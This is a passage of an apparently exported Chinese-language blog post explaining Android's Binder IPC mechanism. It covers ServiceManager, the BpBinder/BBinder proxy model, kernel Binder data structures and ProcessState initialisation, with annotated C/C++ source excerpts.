sp<IBinder>& obj)\n{\n    return new BpServiceManager(obj);\n}\n```\ndefaultServiceManager() 返回的是 BpServiceManager，因为它通过 interface_cast<IServiceManager>() 把一个 BpBinder(0)（远端的 servicemanager 代理）转换成了一个 BpServiceManager 类型的对象。\n\n这个 BpServiceManager 是 servicemanager 的客户端代理，它包装了所有 Binder 通信细节（比如 transact(CHECK_SERVICE)），供 App 或 System Server 调用。\n\n每个进程如果要注册服务，都会创建自己的 BpServiceManager 实例，用来通过 Binder 向 servicemanager 发起 addService() 等调用。\n注意：\n\t•\t虽然每个进程都会 构造一个 BpServiceManager 对象，但这个对象内部都指向 同一个远程 Binder 节点（handle=0），也就是 servicemanager；\n\t•\t所以每个进程只是创建了一个“代理对象”，而不是实际的服务管理器本体；\n\t•\t真正提供服务注册逻辑的，是 servicemanager 进程中的 BnServiceManager::onTransact()。\n\n## 附录","slug":"binder","published":1,"date":"2025-03-29T09:20:11.584Z","updated":"2025-09-21T10:18:20.510Z","_id":"cmd44rit4000uv8fyhuk7ct55","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"1-基础概述\"><a href=\"#1-基础概述\" class=\"headerlink\" title=\"1. 基础概述\"></a>1. 基础概述</h3><p>android 中多进程的通信都会依赖Binder IPC机制<br>1.1 IPC原理<br>从进程的角度看：</p>\n<img src=\"/Blog/2025/03/29/binder/binder_process.png\" class=\"\" title=\"binder_process\">\n<p>每个Android的进程，只能运行在自己进程所拥有的虚拟地址空间。<br>对应一个4GB的虚拟地址空间，其中3GB是用户空间，1GB是内核空间，当然内核空间的大小是可以通过参数配置调整的。<br>对于用户空间，不同进程之间彼此是不能共享的，而内核空间却是可共享的。<br>Client进程向Server进程通信，恰恰是利用进程间可共享的内核内存空间来完成底层通信工作的，Client端与Server端进程往往采用ioctl等方法跟内核空间的驱动进行交互。<br>1.2 binder原理<br><img src=\"./binbinder_principle.png\" alt=\"alt text\"><br><img src=\"./binder/binder_principle.png\" alt=\"alt text\"><br>可以看出无论是注册服务和获取服务的过程都需要ServiceManager，<br>需要注意的是此处的Service Manager是指Native层的ServiceManager（C++），并非指framework层的ServiceManager(Java)。<br>ServiceManager是整个Binder通信机制的大管家，是Android进程间通信机制Binder的守护进程，要掌握Binder机制，<br>首先需要了解系统是如何首次启动Service Manager。当Service Manager启动之后，Client端和Server端通信时都需要先获取Service Manager接口，才能开始通信服务。<br>注册服务(addService)：Server进程要先注册Service到ServiceManager。该过程：Server是客户端，ServiceManager是服务端。<br>获取服务(getService)：Client进程使用某个Service前，须先向ServiceManager中获取相应的Service。该过程：Client是客户端，ServiceManager是服务端。<br>使用服务：Client根据得到的Service信息建立与Service所在的Server进程通信的通路，然后就可以直接与Service交互。该过程：client是客户端，server是服务端。<br>1.3 C/S模式<br>BpBinder(客户端)和BBinder(服务端)都是Android中Binder通信相关的代表，它们都从IBinder类中派生而来，关系图如下：<br><img src=\"binder_cs.png\" alt=\"alt text\"><br>client端：BpBinder.transact()来发送事务请求；<br>server端：BBinder.onTransact()会接收到相应事务。</p>\n<h3 id=\"2-创建binder服务\"><a href=\"#2-创建binder服务\" class=\"headerlink\" title=\"2. 创建binder服务\"></a>2. 创建binder服务</h3><p>数据结构</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span> __u32;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">unsigned</span> <span class=\"type\">long</span> <span class=\"type\">long</span> __u64;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> BINDER_IPC_32BIT</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u32 <span class=\"type\">binder_size_t</span>;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u32 <span class=\"type\">binder_uintptr_t</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u64 <span class=\"type\">binder_size_t</span>;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u64 <span class=\"type\">binder_uintptr_t</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//native层binder通信的数据结构</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_state</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> fd; <span class=\"comment\">// dev/binder的文件描述符</span></span><br><span class=\"line\">    <span class=\"type\">void</span> *mapped; <span class=\"comment\">//指向mmap的内存地址</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> mapsize; <span class=\"comment\">//分配的内存大小，默认为128KB</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_write_read</span> &#123;</span></span><br><span class=\"line\">  <span class=\"type\">binder_size_t</span> write_size;</span><br><span class=\"line\">  <span class=\"type\">binder_size_t</span> write_consumed;</span><br><span class=\"line\">  <span class=\"type\">binder_uintptr_t</span> write_buffer;</span><br><span class=\"line\">  <span class=\"type\">binder_size_t</span> read_size;</span><br><span class=\"line\">  <span class=\"type\">binder_size_t</span> read_consumed;</span><br><span class=\"line\">  <span class=\"type\">binder_uintptr_t</span> read_buffer;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">res = ioctl(bs-&gt;fd, BINDER_WRITE_READ, &amp;bwr);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">binder_parse</span><span class=\"params\">(<span class=\"keyword\">struct</span> binder_state *bs, <span class=\"keyword\">struct</span> binder_io *bio,</span></span><br><span class=\"line\"><span class=\"params\">                 <span class=\"type\">uintptr_t</span> ptr, <span class=\"type\">size_t</span> size, binder_handler func)</span></span><br><span class=\"line\"></span><br><span class=\"line\">从read_buffer中读取binder事务数据，</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//内核层binder通信的数据结构</span></span><br><span class=\"line\">BR_TRANSACTION</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> binder_transaction_data_secctx &#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_transaction_data</span> <span class=\"title\">transaction_data</span>;</span></span><br><span class=\"line\">    <span class=\"type\">binder_uintptr_t</span> secctx; <span class=\"comment\">// secure context 扩展字段</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">[cmd = 0x80000001]             ← 4 字节</span></span><br><span class=\"line\"><span class=\"comment\">[binder_transaction_data]     ← 56 or 64 字节（取决于架构）</span></span><br><span class=\"line\"><span class=\"comment\"> ├─ target.handle</span></span><br><span class=\"line\"><span class=\"comment\"> ├─ cookie</span></span><br><span class=\"line\"><span class=\"comment\"> ├─ code</span></span><br><span class=\"line\"><span class=\"comment\"> ├─ flags</span></span><br><span class=\"line\"><span class=\"comment\"> ├─ sender_pid / euid</span></span><br><span class=\"line\"><span class=\"comment\"> ├─ data_size / offsets_size</span></span><br><span class=\"line\"><span class=\"comment\"> └─ data.ptr.buffer / offsets</span></span><br><span class=\"line\"><span class=\"comment\">[optional: secctx]            ← 只有在 BR_TRANSACTION_SEC_CTX 才有</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">kernel → 用户空间</span></span><br><span class=\"line\"><span class=\"comment\">        |</span></span><br><span class=\"line\"><span class=\"comment\">        ↓</span></span><br><span class=\"line\"><span class=\"comment\">    binder_parse()</span></span><br><span class=\"line\"><span class=\"comment\">        |</span></span><br><span class=\"line\"><span class=\"comment\">        +-- 解析 ptr → txn</span></span><br><span class=\"line\"><span class=\"comment\">        |</span></span><br><span class=\"line\"><span class=\"comment\">        +-- bio_init_from_txn → msg</span></span><br><span class=\"line\"><span class=\"comment\">        |</span></span><br><span class=\"line\"><span class=\"comment\">        +-- func(bs, txn, msg, reply)</span></span><br><span class=\"line\"><span class=\"comment\">        |</span></span><br><span class=\"line\"><span class=\"comment\">        +-- 根据 flags 判断是否 reply / free buffer</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">**/</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#read_buffer去掉binder事务数据，剩下的全是binder对象数据</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_transaction_data</span> &#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">    __u32 handle;</span><br><span class=\"line\">    <span class=\"type\">binder_uintptr_t</span> ptr;</span><br><span class=\"line\">  &#125; target;</span><br><span class=\"line\">  <span class=\"type\">binder_uintptr_t</span> cookie;</span><br><span class=\"line\">  __u32 code;</span><br><span class=\"line\">  __u32 flags;</span><br><span class=\"line\">  <span class=\"type\">pid_t</span> sender_pid;</span><br><span class=\"line\">  <span class=\"type\">uid_t</span> sender_euid;</span><br><span class=\"line\">  <span class=\"type\">binder_size_t</span> data_size;</span><br><span class=\"line\">  <span class=\"type\">binder_size_t</span> offsets_size;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">      <span class=\"type\">binder_uintptr_t</span> buffer;</span><br><span class=\"line\">      <span class=\"type\">binder_uintptr_t</span> offsets;</span><br><span class=\"line\">    &#125; ptr;</span><br><span class=\"line\">    __u8 buf[<span class=\"number\">8</span>];</span><br><span class=\"line\">  &#125; data;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">bio_init_from_txn</span><span class=\"params\">(<span class=\"keyword\">struct</span> binder_io *bio, <span class=\"keyword\">struct</span> binder_transaction_data *txn)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    bio-&gt;data = bio-&gt;data0 = (<span class=\"type\">char</span> *)(<span class=\"type\">intptr_t</span>)txn-&gt;data.ptr.buffer;</span><br><span class=\"line\">    bio-&gt;offs = bio-&gt;offs0 = (<span class=\"type\">binder_size_t</span> *)(<span class=\"type\">intptr_t</span>)txn-&gt;data.ptr.offsets;</span><br><span class=\"line\">    bio-&gt;data_avail = txn-&gt;data_size;</span><br><span class=\"line\">    bio-&gt;offs_avail = txn-&gt;offsets_size / <span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>);</span><br><span class=\"line\">    bio-&gt;flags = BIO_F_SHARED;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_io</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *data;            <span class=\"comment\">/* pointer to read/write from */</span></span><br><span class=\"line\">    <span class=\"type\">binder_size_t</span> *offs;   <span class=\"comment\">/* array of offsets */</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> data_avail;     <span class=\"comment\">/* bytes available in data buffer */</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> offs_avail;     <span class=\"comment\">/* entries available in offsets array */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> *data0;           <span class=\"comment\">/* start of data buffer */</span></span><br><span class=\"line\">    <span class=\"type\">binder_size_t</span> *offs0;  <span class=\"comment\">/* start of offsets buffer */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> flags;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> unused;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">switch</span>(txn-&gt;code)</span><br><span class=\"line\"></span><br><span class=\"line\">do_find_service <span class=\"keyword\">return</span> si-&gt;handle</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> svcinfo</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> svcinfo *next;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> handle;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_death</span> <span class=\"title\">death</span>;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> allow_isolated;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> dumpsys_priority;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> len;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> name[<span class=\"number\">0</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">内核层binder对象数据结构</span></span><br><span class=\"line\"><span class=\"comment\">**/</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_object_header</span> &#123;</span></span><br><span class=\"line\">\t__u32        type;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">flat_binder_object</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_object_header</span>\t<span class=\"title\">hdr</span>;</span></span><br><span class=\"line\">\t__u32\t\t\t\tflags;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* 8 bytes of data. */</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">\t\t<span class=\"type\">binder_uintptr_t</span>\tbinder;\t<span class=\"comment\">/* local object */</span></span><br><span class=\"line\">\t\t__u32\t\t\thandle;\t<span class=\"comment\">/* remote object */</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* extra data associated with local object */</span></span><br><span class=\"line\">\t<span class=\"type\">binder_uintptr_t</span>\tcookie;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_node</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> debug_id;</span><br><span class=\"line\">\t<span class=\"type\">spinlock_t</span> lock;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_work</span> <span class=\"title\">work</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rb_node</span> <span class=\"title\">rb_node</span>;</span></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">hlist_node</span> <span class=\"title\">dead_node</span>;</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_proc</span> *<span class=\"title\">proc</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">hlist_head</span> <span class=\"title\">refs</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> internal_strong_refs;</span><br><span class=\"line\">\t<span class=\"type\">int</span> local_weak_refs;</span><br><span class=\"line\">\t<span class=\"type\">int</span> local_strong_refs;</span><br><span class=\"line\">\t<span class=\"type\">int</span> tmp_refs;</span><br><span class=\"line\">\t<span class=\"type\">binder_uintptr_t</span> ptr;</span><br><span class=\"line\">\t<span class=\"type\">binder_uintptr_t</span> cookie;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t\t * bitfield elements protected by</span></span><br><span class=\"line\"><span class=\"comment\">\t\t * proc inner_lock</span></span><br><span class=\"line\"><span class=\"comment\">\t\t */</span></span><br><span class=\"line\">\t\tu8 has_strong_ref:<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tu8 pending_strong_ref:<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tu8 has_weak_ref:<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tu8 pending_weak_ref:<span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t\t * invariant after initialization</span></span><br><span class=\"line\"><span class=\"comment\">\t\t */</span></span><br><span class=\"line\">\t\tu8 accept_fds:<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tu8 txn_security_ctx:<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tu8 min_priority;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> has_async_transaction;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span> <span class=\"title\">async_todo</span>;</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n\n<ol>\n<li></li>\n<li>ProcessState::self()<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sp&lt;ProcessState&gt; ProcessState::self()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Mutex::Autolock _l(gProcessMutex);</span><br><span class=\"line\">    if (gProcess != nullptr) &#123;</span><br><span class=\"line\">        return gProcess;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    gProcess = new ProcessState(kDefaultDriver);</span><br><span class=\"line\">    return gProcess;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ProcessState::ProcessState(const char *driver)</span><br><span class=\"line\">    : mDriverName(String8(driver))</span><br><span class=\"line\">    , mDriverFD(open_driver(driver))</span><br><span class=\"line\">    , mVMStart(MAP_FAILED)</span><br><span class=\"line\">    , mThreadCountLock(PTHREAD_MUTEX_INITIALIZER)</span><br><span class=\"line\">    , mThreadCountDecrement(PTHREAD_COND_INITIALIZER)</span><br><span class=\"line\">    , mExecutingThreadsCount(0)</span><br><span class=\"line\">    , mMaxThreads(DEFAULT_MAX_BINDER_THREADS)</span><br><span class=\"line\">    , mStarvationStartTimeMs(0)</span><br><span class=\"line\">    , mManagesContexts(false)</span><br><span class=\"line\">    , mBinderContextCheckFunc(nullptr)</span><br><span class=\"line\">    , mBinderContextUserData(nullptr)</span><br><span class=\"line\">    , mThreadPoolStarted(false)</span><br><span class=\"line\">    , mThreadPoolSeq(1)</span><br><span class=\"line\">    , mCallRestriction(CallRestriction::NONE)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (mDriverFD &gt;= 0) &#123;</span><br><span class=\"line\">        // mmap the binder, providing a chunk of virtual address space to receive transactions.</span><br><span class=\"line\">        //私有的，可读不可写</span><br><span class=\"line\">        mVMStart = mmap(nullptr, BINDER_VM_SIZE, PROT_READ, MAP_PRIVATE | MAP_NORESERVE, mDriverFD, 0);</span><br><span class=\"line\">        if (mVMStart == MAP_FAILED) &#123;</span><br><span class=\"line\">            // *sigh*</span><br><span class=\"line\">            ALOGE(&quot;Using %s failed: unable to mmap transaction memory.\\n&quot;, mDriverName.c_str());</span><br><span class=\"line\">            close(mDriverFD);</span><br><span class=\"line\">            mDriverFD = -1;</span><br><span class=\"line\">            mDriverName.clear();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    LOG_ALWAYS_FATAL_IF(mDriverFD &lt; 0, &quot;Binder driver could not be opened.  Terminating.&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ProcessState::~ProcessState()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (mDriverFD &gt;= 0) &#123;</span><br><span class=\"line\">        if (mVMStart != MAP_FAILED) &#123;</span><br><span class=\"line\">            munmap(mVMStart, BINDER_VM_SIZE);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        close(mDriverFD);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    mDriverFD = -1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ol>\n<p>service_manager</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">binder_write</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">for</span><span class=\"params\">(::)</span></span><br><span class=\"line\">    <span class=\"title function_\">binder_read</span><span class=\"params\">()</span>;? <span class=\"comment\">//什么进行了阻塞？</span></span><br><span class=\"line\"></span><br><span class=\"line\">    binder_parse();</span><br></pre></td></tr></table></figure>\n<p>一句话总结：servicemanager 是通过 ioctl(fd, BINDER_SET_CONTEXT_MGR) 向内核注册了自己的 BBinder 对象，成为了 handle 0，</p>\n<h3 id=\"获取binder服务\"><a href=\"#获取binder服务\" class=\"headerlink\" title=\"获取binder服务\"></a>获取binder服务</h3><figure class=\"highlight cpp\"><figcaption><span>懒汉式单例模式</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> sp&lt;ProcessState&gt; gProcess;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">sp&lt;ProcessState&gt; <span class=\"title\">ProcessState::self</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    Mutex::Autolock _l(gProcessMutex);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (gProcess != <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">        <span 